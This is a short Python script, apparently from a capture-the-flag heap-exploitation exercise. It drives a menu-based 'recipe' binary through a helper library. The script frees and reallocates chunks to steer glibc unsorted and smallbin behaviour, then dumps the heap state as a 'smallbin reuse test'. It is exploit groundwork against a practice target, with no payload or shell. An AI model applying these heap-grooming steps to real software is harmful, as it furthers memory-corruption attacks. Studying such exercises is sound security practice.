import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G()
# create recipes with bars to avoid consolidation, free two, sort via a dish cook, then add recipe from smallbin
g.add(b'A1'); g.make(b'b1'); g.add(b'B2'); g.make(b'b2'); g.add(b'C3'); g.make(b'b3')
g.rm(b'A1'); g.rm(b'C3')   # free A1 and C3 (non-adjacent, bars between) -> unsorted
# cook a dish (0x40) to force sorting of unsorted 0x90 chunks into smallbin
# need cookable recipe with stock: Beef noodles (Flouir+Beef), inventory has some
g.ru(b'Your choice: '); g.sl(b'5'); g.ru(b'What do you want to cook :'); g.sl(b'Beef noodles'); g.ru(b'Done !')
g.add(b'D4')   # reuse from smallbin/unsorted
g.dump('smallbin reuse test')
g.close()
